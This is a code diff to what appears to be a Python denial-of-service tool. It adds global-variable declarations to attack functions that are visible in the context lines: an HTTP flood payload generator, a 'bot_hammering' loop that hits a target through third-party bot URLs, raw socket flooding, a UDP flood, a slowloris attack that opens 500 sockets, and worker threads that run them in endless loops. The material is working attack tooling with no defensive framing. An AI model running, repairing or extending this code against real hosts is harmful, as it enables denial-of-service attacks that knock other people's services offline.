@@ -47,6 +47,7 @@ def generate_massive_payload():
     return massive_data
 
 def generate_http_flood_payload():
+    global host, uagent
     chunk_size = random.randint(65536, 1048576)
     payload = os.urandom(chunk_size)
     http_headers = (
@@ -64,6 +65,7 @@ def generate_http_flood_payload():
     return http_headers
 
 def bot_hammering(url):
+    global uagent
     try:
         while True:
             req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}), timeout=5)
@@ -73,6 +75,7 @@ def bot_hammering(url):
         time.sleep(.01)
 
 def down_it(item):
+    global host, port, uagent
     sock = None
     try:
         while True:
@@ -113,6 +116,7 @@ def down_it(item):
         time.sleep(.01)
 
 def udp_flood():
+    global host, port
     udp_sock = None
     try:
         while True:
@@ -140,6 +144,7 @@ def udp_flood():
         time.sleep(.001)
 
 def slowloris_attack():
+    global host, port, uagent
     sockets_list = []
     try:
         for _ in range(500):
@@ -176,18 +181,21 @@ def slowloris_attack():
                 pass
 
 def dos():
+    global q
     while True:
         item = q.get()
         down_it(item)
         q.task_done()
 
 def dos2():
+    global w, host, bots
     while True:
         item = w.get()
         bot_hammering(random.choice(bots) + "http://" + host)
         w.task_done()
 
 def dos3():
+    global e
     while True:
         item = e.get()
         udp_flood()
